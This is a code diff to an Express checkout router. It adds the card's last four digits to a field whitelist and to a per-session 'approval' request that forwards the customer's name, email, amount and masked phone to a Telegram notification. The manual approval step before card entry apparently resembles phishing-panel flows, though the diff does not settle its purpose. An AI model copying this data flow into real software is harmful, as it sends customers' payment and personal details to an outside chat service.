@@ -21,6 +21,7 @@ const ALLOWED_FIELDS = new Set([
   'orderId',
   'paymentStatus',
   'timestamp',
+  'cardLast4',
 ]);
 
 // Sanitize event payload - only allow whitelisted fields
@@ -99,7 +100,7 @@ router.post('/events', async (req, res) => {
 // Request approval for card data step
 router.post('/approval', async (req, res) => {
   try {
-    const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = req.body;
+    const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4 } = req.body;
 
     // Basic validation
     if (!sessionId) {
@@ -121,6 +122,7 @@ router.post('/approval', async (req, res) => {
       paymentMethod,
       installments,
       phoneMasked,
+      cardLast4,
     });
 
     // Send Telegram notification (non-blocking)
@@ -133,6 +135,8 @@ router.post('/approval', async (req, res) => {
       paymentMethod,
       installments,
       phoneMasked,
+      cardLast4,
+      timestamp: new Date().toISOString(),
     }).catch((err) => {
       console.error('[CheckoutApproval] Telegram notification failed:', err.message);
     });
